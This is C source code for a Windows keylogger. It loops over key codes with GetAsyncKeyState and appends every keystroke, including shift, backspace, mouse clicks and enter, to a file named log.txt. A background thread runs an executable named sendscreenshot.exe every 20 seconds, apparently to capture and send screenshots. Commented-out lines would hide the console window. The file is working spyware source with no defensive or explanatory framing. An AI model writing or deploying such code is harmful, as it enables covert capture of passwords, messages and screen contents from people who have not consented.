#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <pthread.h>
#include <unistd.h>

void* callPythonScript(void* arg) {
    while (1) {
        system("dist\\sendscreenshot.exe");
        sleep(20);
    }
    pthread_exit(NULL);
}

int SaveLogs(int key_stroke, char *file);

int main() {
    pthread_t thread;
    int result = pthread_create(&thread, NULL, callPythonScript, NULL);
    if (result != 0) {
        printf("Failed to create thread.\n");
        return 1;
    }
    char i;
    //HWND hwnd = GetConsoleWindow();
    //ShowWindow(hwnd, SW_HIDE);
    while (1) {
        for (i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                SaveLogs(i, "log.txt");
            }
        }
    }
    pthread_join(thread, NULL);
    return 0;
}

int SaveLogs(int key_stroke, char *file) {
    FILE *logs;

    logs = fopen(file, "a+");

    if (logs == NULL) {
        return 1;
    }

    if (key_stroke == VK_SHIFT) {
        fprintf(logs, "%s", "[SHIFT]");
    } else if (key_stroke == VK_BACK) {
        fprintf(logs, "%s", "[BACKSPACE]");
    } else if (key_stroke == VK_LBUTTON) {
        fprintf(logs, "%s", "[LCLICK]");
    } else if (key_stroke == VK_RBUTTON) {
        fprintf(logs, "%s", "[RCLICK]");
    } else if (key_stroke == VK_RETURN) {
        fprintf(logs, "%s", "\n");
    } else if (key_stroke == VK_ESCAPE) {
        fprintf(logs, "%s", "[ESCAPE]");
    } else {
        fprintf(logs, "%s", &key_stroke);
    }

    fclose(logs);

    return 0;
}
